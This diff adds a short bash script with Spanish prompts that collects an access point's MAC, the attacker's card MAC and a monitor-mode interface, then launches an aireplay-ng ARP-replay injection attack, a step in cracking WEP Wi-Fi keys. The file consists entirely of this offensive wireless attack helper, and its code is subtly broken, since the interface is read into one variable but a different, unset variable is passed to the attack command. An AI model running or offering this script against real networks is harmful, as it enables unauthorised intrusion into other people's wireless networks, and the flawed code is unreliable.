@@ -1,0 +1,10 @@
+echo "MAC AP: ";
+read MAC_AP;
+echo $MAC_AP;
+echo "MAC tarjeta: ";
+read MAC_T;
+echo $MAC_T;
+echo "Interface modo monitor: ";
+read INTERFACE_M;
+echo $INTERFACE_M;
+aireplay-ng -3 -b $MAC_AP -h $MAC_T $INTERFACE_T; 
